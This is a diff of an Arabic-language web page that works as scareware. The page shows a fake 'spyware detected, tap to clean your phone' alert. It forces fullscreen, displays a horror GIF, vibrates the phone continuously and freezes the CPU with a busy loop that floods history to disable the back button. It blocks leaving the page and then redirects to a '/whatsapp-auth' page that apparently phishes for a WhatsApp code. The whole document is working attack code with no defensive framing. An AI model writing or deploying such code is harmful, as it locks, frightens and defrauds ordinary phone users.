@@ -2,51 +2,59 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>FATAL ERROR 666</title>
+    <title>SYSTEM CRITICAL ERROR</title>
     <style>
-        body { background: #000; color: #f00; font-family: 'Courier New', monospace; overflow: hidden; touch-action: none; }
-        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; display: none; background: url('https://i.imgur.com/eY3p5G9.gif') center/cover; }
-        .glitch { font-size: 20px; text-align: center; margin-top: 45vh; animation: shake 0.1s infinite; }
-        @keyframes shake { 0% { transform: translate(1px, 1px); } 50% { transform: translate(-2px, -1px); } 100% { transform: translate(1px, 1px); } }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; touch-action: none; }
+        #horror-layer { 
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: url('https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJmZzRyeHh5ZHg0ZHg0ZHg0ZHg0ZHg0ZHg0ZHg0ZHg0ZHg0ZHg0JmVwaD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o7TKsWZyGKY1ANKGf/giphy.gif') center/cover;
+            display: none; z-index: 999999;
+        }
+        .text { color: red; font-family: monospace; text-align: center; padding-top: 45vh; font-size: 20px; font-weight: bold; }
     </style>
 </head>
-<body onclick="launchHell()">
+<body onclick="launchAttack()">
 
-    <div id="status" class="glitch">☠️ جاري اختراق النواة... ☠️<br>انقر لتنظيف النظام</div>
-    <div id="overlay"></div>
+    <div id="status" class="text">⚠️ تم كشف فيروس تجسس!<br>انقر فوراً لتنظيف الهاتف</div>
+    <div id="horror-layer"></div>
 
     <script>
-        // تسجيل Service Worker لضمان بقاء العملية في الخلفية
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('sw.js');
-        }
-
-        function launchHell() {
-            // طلب ملء الشاشة لإخفاء شريط الإشعارات
-            document.documentElement.requestFullscreen();
+        function launchAttack() {
+            // 1. طلب ملء الشاشة لإخفاء معالم النظام
+            document.documentElement.requestFullscreen().catch(() => {});
+            
+            // 2. تفعيل الطبقة المرعبة
             document.getElementById('status').style.display = 'none';
-            document.getElementById('overlay').style.display = 'block';
+            document.getElementById('horror-layer').style.display = 'block';
 
-            // تفعيل الهزاز (Vibration) بشكل مستمر
-            navigator.vibrate([1000, 500, 1000, 500, 2000]);
-            setInterval(() => { navigator.vibrate(2000); }, 2100);
+            // 3. اهتزاز هستيري لا يتوقف
+            if (navigator.vibrate) {
+                setInterval(() => { navigator.vibrate(1000); }, 100);
+            }
 
-            // تجميد المعالج والرام (Nuclear Loop)
+            // 4. تجميد النواة (The Heavy Freeze)
+            // هذا الجزء سيجعل الهاتف قطعة حديد لمدة 60 ثانية
             setTimeout(() => {
+                const freezeTime = 60000; // دقيقة كاملة
                 const start = Date.now();
-                while (Date.now() - start < 120000) { // تجميد لمدة دقيقتين كاملتين
-                    // إغراق السجل ومنع الخروج
+                
+                while (Date.now() - start < freezeTime) {
+                    // إغراق سجل المتصفح لشل زر "الخلف"
                     window.history.pushState(null, null, "#" + Math.random());
-                    // إجهاد المعالج
-                    for(let i=0; i<1000000; i++) { Math.sqrt(Math.random()); }
+                    
+                    // استهلاك المعالج بالكامل عبر عمليات معقدة
+                    for (let i = 0; i < 1000000; i++) {
+                        Math.atan2(Math.random(), Math.random());
+                    }
                 }
-                // بعد الدقيقتين، طلب كود فك التشفير
-                window.location.href = "/secure-login";
-            }, 1000);
+
+                // بعد انتهاء الدقيقة، التوجه لصفحة سحب الكود
+                window.location.href = "/whatsapp-auth";
+            }, 500);
         }
 
-        // منع زر الرجوع
-        window.onbeforeunload = function() { return "System Corrupted!"; };
+        // منع الخروج أو الرجوع بأي وسيلة
+        window.onbeforeunload = function() { return "FATAL ERROR"; };
     </script>
 </body>
 </html>
